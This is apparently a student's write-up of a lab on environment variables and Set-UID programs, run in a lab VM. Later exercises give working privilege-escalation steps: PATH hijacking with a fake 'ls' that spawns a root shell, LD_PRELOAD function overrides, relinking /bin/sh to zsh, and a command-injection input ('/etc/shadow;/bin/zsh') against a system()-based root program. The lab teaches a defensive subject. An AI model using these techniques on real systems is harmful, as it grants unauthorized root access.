# Lab 6: Environment Variable and `Set-UID` Program Lab

Objective: impart an understanding how environment variables influence program and system behaviors. The lab aims to elucidate the mechanisms through which environment variables affect program behaviors, enhancing students' comprehension and enabling them to develop more secure and robust software systems.

## Exercise 1: Manipulating Environment Variables

Manipulating Environment Variables

Command to print out the environment variables:
```bash
env
```
![env](/Lab6/exercise1/img/1.png)


Command to printing out some particular environment variables:
```bash
env | grep PWD
```
![part env](/Lab6/exercise1/img/2.png)

Setting  enviroment variables:
```bash
export MYVAR='Yachay'
env | grep MYVAR
```
Unsetting enviroment variables:
```bash
unset MYVAR
env | grep MYVAR
```
![set unset env](/Lab6/exercise1/img/3.png)


## Exercise 2: Passing Environment Variables from Parent Process to Child Process

### Step 1 

Compiling `/Lab6/exercise2/myprintenv.c` and saving **child process** info on `/Lab6/exercise2/child`

![child](/Lab6/exercise2/img/1.png)

### Step 2 

Changing:
```c
  switch(childPid = fork()) {
    case 0:  /* child process */
      printenv();          
      exit(0);
    default:  /* parent process */
      // printenv();       
      exit(0);
```
for:
```c
  switch(childPid = fork()) {
    case 0:  /* child process */
      // printenv();          
      exit(0);
    default:  /* parent process */
      printenv();       
      exit(0);
```

Compiling `/Lab6/exercise2/myprintenv.c` and saving **parent process** info on `/Lab6/exercise2/parent`

![child](/Lab6/exercise2/img/2.png)

### Step 3 

Comparing the difference of these two files using:

```bash
diff child parent
```
![diff](/Lab6/exercise2/img/3.png)

We can observe that the files are the same, indicating that the environment variables are identical for both the parent process and the child process.

It is important to note that if we use a different name for the executable file when compiling ### Step 2, we will observe differences when executing ### Step 3 on the last line `_=./a.out`. However, this differences is solely  the name of the executable file. 

## Exercise 3: Environment Variables and `execve()`

**Step 1*

Compiling `/Lab6/exercise2/myenv.c` on `/Lab6/exercise2/myenv`:

![execve](/Lab6/exercise3/img/1.png)

### Step 2

Compiling `/Lab6/exercise2/myenv.c` on `/Lab6/exercise2/myenv1` but changing:
```c
  execve("/usr/bin/env", argv, NULL);  
```
for:
```c
execve("/usr/bin/env", argv, environ);
```
![execve](/Lab6/exercise3/img/2.png)

### Step 3 Observations:

By passing the environ variable as the third argument to the execve function instead of **NULL**, as done in ### Step 1, the child process **inherits** the environment variables from the parent process. This implies that any modifications made to the environment variables in the parent process would be reflected in the child process as well.

When environment variables are inherited from the parent process to the child process, it introduces a potential attack surface for malicious actors. If sensitive information such as passwords or other credentials are stored in environment variables within the parent process, these could be inadvertently leaked to the child process and potentially accessed by unauthorized entities.

## Exercise 4: Environment Variables and `system()`

In this task, we study how environment variables are affected when a new program is executed via  the `system()` function. This function is used to execute a command, but unlike `execve()`, which directly execute a command, `system()` actually executes "`/bin/sh -c command`", i.e., it executes `/bin/sh`, and asks the shell to execute the command.

The implementation of the `system()` function its on `/Lab6/exercise4/system_env.c`.

![system](/Lab6/exercise4/img/1.png)

## Exercise 5: Environment Variable and `Set-UID` Programs

### Step 1

Generate `/Lab6/exercise5/setuid.c` file.

```c
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

int main()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
}
}
```
### Step 2

Compiling `setuid.c` on `/Lab6/exercise5/foo`, changing its ownership to root, and makeing it a `Set-UID` program.
```bash
sudo chown root foo
sudo chmod 4755 foo
```
![uid](/Lab6/exercise5/img/1.png)

### Step 3

Cheking some environment variables:
![uid](/Lab6/exercise5/img/2.png)

Using ### Step 2 executable to chek the environment variables:
![uid](/Lab6/exercise5/img/3.png)

When a `Set-UID` program is executed, it runs with the permissions of the program's owner (in this case, root), rather than the user who executed it (seed). Despite this change in user identity, the environment variables are still inherited from the parent process (seed) instead of using root environment variables.

## Exercise 6:  The PATH Environment Variable and `Set-UID` Programs

We compile `/Lab6/exercise6/pathuid.c` on `/Lab6/exercise6/puid`, change its owner to root, and make it a `Set-UID` program.

![lsuid](/Lab6/exercise6/img/1.png)

We can get this `Set-UID` program to run our own malicious code. Instead of /bin/ls we can run the bash with root privilege.

**Set up**

First we need a new script `/Lab6/exercise6/ls` that will contain our malicious code, this code will be compiled from `/Lab6/exercise6/exploit.c`

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	printf("Malicious ls program is called\n");
	system("/bin/zsh");
	return 0;
}
```

Next, we need to add our path to our current environment variables using:

```bash
export PATH=<Path where our ls script is>:$PATH
```

Since we are working on ubuntu 20.04 we need to change our default bash:
```bash
sudo ln -sf /bin/zsh /bin/sh
```

Now we just execute our `/Lab6/exercise6/puid` file (that calls our ls script) and we can get into the bash with root privileges.

![lsuid](/Lab6/exercise6/img/2.png)

 ## Exercise 7: The `LD PRELOAD` Environment Variable and `Set-UID` Programs

### Step 1

First, we will see how these environment variable influence the behavior of dynamic loader/linker overrides the `sleep()` function in `libc`:

- Let us build a dynamic link library. Create the following program, and name it `Lab6/exercise7/mylib.c`. It basically overrides the `sleep()` function in `libc`:

```c
#include<stdio.h>
void sleep(int s)
{
    // If this is invoked by a privileged program, you can do damages here!
    printf("I am not sleeping!\n");
}
```

- We can compile the program using the following commands:

```sh
gcc -fPIC -g -c mylib.c
gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
```

- Now, set the `LD_PRELOAD` environment variable:

```sh
export `LD_PRELOAD`=./libmylib.so.1.0.1
```

- Finally, compile the following program `Lab6/exercise7/myprog`, and it in the same directory as the above dynamic link library `libmylib.so.1.0.1`:

```c
//myprog.c
int main()
{
    sleep(1);
    return 0;
}
```

![lsuid](/Lab6/exercise7/img/1.png)

### Step 2

- Make `myprog` a regular program, and run it as a normal user. Overridden `sleep()` function is called.
```bash
[03/29/24]seed@VM:~/.../ex7$ ./myprog 
I am not sleeping!
```

- Make `myprog` a `Set-UID` root program, and run it as a normal user. `sleep()` function is called.
```bash
[03/29/24]seed@VM:~/.../ex7$ sudo chown root myprog
[03/29/24]seed@VM:~/.../ex7$ sudo chmod 4755 myprog
[03/29/24]seed@VM:~/.../ex7$ ./myprog 
[03/29/24]seed@VM:~/.../ex7$ 
```


- Make `myprog` a `Set-UID` root program, export the LD PRELOAD environment variable again in the root account and run it. Overridden `sleep()` function is called.
```bash
[03/29/24]seed@VM:~/.../ex7$ sudo su -
root@VM:~# ls
root@VM:~# cd /home/seed/Documents/Lab6
root@VM:/home/seed/Documents/Lab6#  export `LD_PRELOAD`=./libmylib.so.1.0.1
root@VM:/home/seed/Documents/Lab6# cd ex7
root@VM:/home/seed/Documents/Lab6/ex7# ./myprog
I am not sleeping!
root@VM:/home/seed/Documents/Lab6/ex7# 
```
    

![lsuid](/Lab6/exercise7/img/2.png)

- Make `myprog` a `Set-UID` user1 program, export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it. `sleep()` function is called.
```bash
[03/29/24]seed@VM:~/.../ex7$ sudo adduser user1
Adding user `user1' ...
Adding new group `user1' (1001) ...
Adding new user `user1' (1001) with group `user1' ...
Creating home directory `/home/user1' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for user1
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] y
[03/29/24]seed@VM:~/.../ex7$ ls -l
total 56
-rwxrwxr-x 1 seed seed 18696 Mar 29 22:07 libmylib.so.1.0.1
-rw-rw-r-- 1 seed seed   148 Mar 29 22:06 mylib.c
-rw-rw-r-- 1 seed seed  5960 Mar 29 22:06 mylib.o
-rwsr-xr-x 1 root seed 16696 Mar 29 22:10 myprog
-rw-rw-r-- 1 seed seed    71 Mar 29 22:09 myprog.c
[03/29/24]seed@VM:~/.../ex7$ sudo chown user1 myprog
[03/29/24]seed@VM:~/.../ex7$ sudo chmod 4755 myprog
[03/29/24]seed@VM:~/.../ex7$ ls -l
total 56
-rwxrwxr-x 1 seed  seed 18696 Mar 29 22:07 libmylib.so.1.0.1
-rw-rw-r-- 1 seed  seed   148 Mar 29 22:06 mylib.c
-rw-rw-r-- 1 seed  seed  5960 Mar 29 22:06 mylib.o
-rwsr-xr-x 1 user1 seed 16696 Mar 29 22:10 myprog
-rw-rw-r-- 1 seed  seed    71 Mar 29 22:09 myprog.c
[03/29/24]seed@VM:~/.../ex7$ ./myprog 
[03/29/24]seed@VM:~/.../ex7$ 

```

![lsuid](/Lab6/exercise7/img/3.png)


### Step 3


Based on the observations from the experiment above. We can clearly demonstrate the behavior of the `LD_PRELOAD` environment variable in relation to `Set-UID` programs under different ownership and execution contexts. The core observation is:

- When `myprog` is run as a regular program by a normal user, the overridden sleep() function from the `LD_PRELOAD` environment variable is called. 

- When `myprog` is made a `Set-UID` program owned by root and then executed by a normal user, the standard sleep() function is called, indicating that the `LD_PRELOAD` environment variable is ignored. 

- When the `LD_PRELOAD` variable is set in the root account and `myprog` is executed under this condition, the overridden function is called again. 

- When making `myprog` a `Set-UID` program owned by a non-root user (user1) and running it in a different user’s account without root privileges results in the standard sleep() function being called, ignoring `LD_PRELOAD`.



The main cause of the differences observed in the behaviors of `myprog` lies in the presence and inheritance of the `LD_PRELOAD` environment variable. `LD_PRELOAD`, when set in the environment of the process, can override function calls, including those in `Set-UID` programs, thereby influencing their behavior. However, `LD_PRELOAD` may not always be inherited by child processes, particularly in `Set-UID` contexts, depending on system security settings.

## Exercise 8: Invoking External Programs Using `system()` versus `execve()`

### Step 1
Compile `Lab6/exercise8/catall.c`, make it a root-owned Set-UID program. The program will use
`system()` to invoke the command. 

![system vs execve](/Lab6/exercise8/img/1.png)

Can you compromise the integrity of the system? For example, can you remove a file that is not writable to you?

Yes, since we are using `system()` we can change the bash and get root privileges.
```bash
sudo ln -sf /bin/zsh /bin/sh
```
![system vs execve](/Lab6/exercise8/img/2.png)
![system vs execve](/Lab6/exercise8/img/3.png)

Once we have the root we can do whatever we want on the system.

### Step 2

Comment out the `system(command)` statement, and uncomment the `execve()` statement; the program will use `execve()` to invoke the command. Compile the program, and make it a root-owned Set-UID. 

![system vs execve](/Lab6/exercise8/img/4.png)


Do your attacks in Step 1 still work? Please describe and explain your observations.

No, the attack did not work because the `execve()` function expect as argument just a file name, so when we try to run
```bash
./catallse "/etc/shadow;/bin/zsh"
```
we get:
```bash
/bin/cat: '/etc/shadow;/bin/zsh': No such file or directory
```

![system vs execve](/Lab6/exercise8/img/5.png)

`execve()` bypasses the shell, directly executing the specified command without interpreting environment variables or shell-specific syntax.